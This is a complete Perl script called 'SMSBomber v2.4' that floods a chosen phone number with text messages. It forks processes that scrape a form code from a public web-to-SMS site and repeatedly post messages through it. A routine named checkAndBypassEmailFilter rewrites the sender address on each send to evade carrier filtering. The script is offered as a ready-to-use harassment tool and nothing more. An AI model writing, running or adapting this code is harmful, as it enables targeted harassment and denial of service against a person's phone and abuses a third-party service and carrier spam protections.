#!/usr/bin/perl

use LWP::UserAgent;
use LWP::Simple;
use strict;
use warnings;
use threads;
use threads::shared;
use Config;
use HTML::TreeBuilder;
use HTML::Element;



$Config{useithreads} or die('Recompile Perl with threads to run this program.'); #thread(enabled) check


print"**********************************************************\n";
print"*********************** SMSBomber v2.4 *******************\n";
print"************************By: juicyjuice********************\n";
print"**********************************************************\n";

##getting inputs, need to get rid of whitespace and or \n character with chomp();
print"Enter the number you want to bomb: \n";
chomp(my $phoneNum = <STDIN>);

print "Enter your carrier (AT&T=41|Verizon=203|Sprint=176): \n";
chomp(my $carrier = <STDIN>);

print "How many messages?: \n";
chomp(my $amountOfMessages = <STDIN>);

print "Enter your email: \n";
chomp(my $from = <STDIN>);

print "Enter your subject: \n";
chomp(my $subject = <STDIN>);

print "Enter your SMS MSG: \n";
chomp(my $message = <STDIN>);

print "**********************************************************\n";
print "**BOMBING\n";
my $numOfBombsSent :shared = 0;       
my $inc :shared = 0; 
$inc = 10000; #incrementing variable used for carriers that sort messages by email instead of phone #
&main;

sub main{
	while($numOfBombsSent<$amountOfMessages){
		&checkAndBypassEmailFilter;
		if(($amountOfMessages-$numOfBombsSent)==1){ 
			&checkAndBypassEmailFilter;
			&bomb;
		} else {
			my $pid = fork();   #fork splits process into two
			if($pid){      #immediately have to handle both ($pid,0) <-child and ($pid) <- parent **parent	
				if($numOfBombsSent<$amountOfMessages){
					&checkAndBypassEmailFilter;				#has to make sure that child is done executing before it finishes. or else child will 
					&bomb; #parent							#become a zombie
				}     						
				waitpid($pid, 0);
			} elsif($pid == 0){
				if($numOfBombsSent<$amountOfMessages){
					&checkAndBypassEmailFilter;
					&bomb; #child
				}
			} else {
				die "Fork failed";
			}
		}
	}
}

sub checkAndBypassEmailFilter{
	if($carrier==203 or $carrier==176){ #this is for some carriers that organize based on the email function (thus not getting the full bomb effect) 
										#so this increments their email by one each time to start a new convo :D gotcha bitch
		my @email = split('@', $from);
		lock($inc);						#locks $inc variable so nothing else can modify it until it's done with it. 
		$from = $email[0].$inc++.'@'.$email[1];
	}
}
sub postUrl {
	my $content = 
	my($url, $formref) = @_;
	my $ua = new LWP::UserAgent(timeout => 300); # set up a UserAgent object to handle request
	$ua->agent('perlproc/1.0');
	my $response = $ua->post($url, $formref);  #no need to handle the response from server. 
	if($response->is_success){ 
		return $response->content;
	} else {
		return "POST failure";
	}
}
sub Return_Code { #From Saustin's SMS bomber
    my $content = $_[0];
    my $tree = HTML::TreeBuilder->new;
    $tree->parse($content);
    $tree->elementify();

    my @elements = $tree->find("INPUT"); #because they haven't heard of lowercase
    foreach(@elements)
    {
        my $ele = $_;
        if($ele->attr('NAME') eq "code")
        {
            return $ele->attr('value');
        }
    }
}

sub bomb{
	my $url = "http://www.onlinetextmessage.com/send.php";
	my $indexUrl = "http://www.onlinetextmessage.com/";
	my $lwp = get $indexUrl;
	my $code = Return_Code($lwp);
	#print "Code: $code\n";
	my %param = ('carrier' => $carrier, 'code' => $code, 'from' => $from, 'message' => $message, 'number' => $phoneNum,'quicktext' => '','remember' => 'y', 's' => 'Send Message','subject' => $subject);
	&postUrl($url,\%param);
	lock($numOfBombsSent);			#locks $numOfBombsSent variable so nothing else can modify it until it's done with it. 
	$numOfBombsSent++;
	print "Bomb Status: [",($numOfBombsSent),"/",($amountOfMessages),"]\n";
}
